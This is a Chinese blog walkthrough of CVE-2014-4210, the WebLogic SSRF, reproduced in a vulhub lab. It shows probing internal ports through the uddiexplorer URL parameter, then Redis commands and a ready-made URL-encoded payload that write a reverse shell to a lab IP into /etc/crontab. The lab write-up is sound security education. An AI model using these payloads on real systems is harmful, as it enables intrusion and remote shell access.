# CVE-2014-4210 Weblogic SSRF 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15747422.html`](https://www.cnblogs.com/peace-and-romance/p/15747422.html)

### 0X00-引言

* * *

哥哥，且随我去梁山可好？

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

Weblogic 中存在一个 SSRF 漏洞，利用该漏洞可以发送任意 HTTP 请求，进而攻击内网中 redis、fastcgi 等脆弱组件。

影响版本：weblogic 10.0.2 -- 10.3.6

可进行利用的 cron 有如下几个地方：

*   /etc/crontab
*   /etc/cron.d/* 将任意文件写到该目录下，效果和 crontab 相同，格式也要和/etc/crontab 相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹 shell。
*   /var/spool/cron/root centos 系统下 root 用户的 cron 文件
*   /var/spool/cron/crontabs/root debian 系统下 root 用户的 cron 文件

### 0X03-漏洞复现

* * *

访问 uddiexplorer 应用

`http://192.168.234.128:7001/uddiexplorer/`

![image-20211228142545174](img/fb87004ab12b127fbe999d78bafcfba0.png)

点击 Search Public Registries 页面，查看页面-发现有参数传入 url-可能存在 SSRF 漏洞

![image-20211228145832506](img/1067ed66d30beb5a68d40e6a8b393e32.png)

抓包测试

原包

![image-20211228150115092](img/971e7d1f9532c3cca56b891886a9bb11.png)

修改包-访问回环地址的 7001 端口-正常返回 404

![image-20211228150208162](img/928d82ef45e0c738273e8f610c9da5ed.png)

修改不存在的端口-端口不存在

![image-20211228150336900](img/4bf0a2d942e24da1da60440990fcda0b.png)

返回值的差异看可以看出，我们可以通过此次链接对内网进行端口探测

这里我们是白盒测试-直接到靶机内查看容器的内网地址-同时也知道存在 redis 数据库

黑盒测试直接爆破 url

```
docker inspect 容器 ID 
```

![image-20211228150805606](img/0327068c67ff5e59bda43bd8bb15f5aa.png)

使用 SSRF 探测-回显说不存在有效的 SOAP 类-说明这个链接端口开放

![image-20211228151316731](img/e051b920efc7113ac7b862420ef43692.png)

由白盒测试可知-内网存在 Redis 服务器-写入脚本

发送 Redis 命令-将反弹 shell 的脚本写入目录/etc/crontab 中，这个目录下面的命令都是定时自动执行的，这点很重要

```
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/evil/192.168.234.135/1234 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save 
```

| 命令行 | 释义 |
| --- | --- |
| set 1 … | 将 bash shell 设置为变量“1”的 value 值，执行一个反弹 shell，IP 为 Kali 虚拟机 IP |
| set dir /etc/ | 创建一个工做目录 |
| config set dbfilename crontab | 建立一个 RDB 备份文件，文件名 crontab；全部的 RDB 文件都会储存在 etc/crontab 下 |

url 编码之后-用换行符隔开(换行符是“\r\n”，也就是“%0D%0A”)

建议使用以下数据直接修改 IP 和 PORT(自己编码可能会使 payload 出现问题导致写入不了 redis 或写入数据不完整)(以下数据开头结尾添加了 test 和 aaa)

```
test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.234.135%2F1234%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 
```

![image-20211229093220472](img/228894c285239d954033b1cce0755c3a.png)

进入 docker 容器内部查看 crontab 文件

```
docker exec -it  Redis 容器号  /bin/sh #进入容器
cat /etc/crontab  #查看文件 
```

如图则写入成功

![image-20211229093712390](img/cd282401e7f2805aa0ffbc03876b616f.png)

稍等片刻即可反弹 shell

![image-20211229093800688](img/639d189dc21be3aa3cc8489d5206a20f.png)

### 0X04-工具检测

* * *

工具需要自己在 GitHub 上面找

![image-20211229095925860](img/c48ba97c0b8a7cebceb70d0b64c1d885.png)

### 0X05-漏洞防御

* * *

升级新版本

### 0X06-免责声明

* * *

仅供学习参考

### 0X07-参考

* * *

[`www.javashuo.com/article/p-druhpgnn-mu.html`](http://www.javashuo.com/article/p-druhpgnn-mu.html)

[`vulhub.org/#/environments/weblogic/ssrf/`](https://vulhub.org/#/environments/weblogic/ssrf/)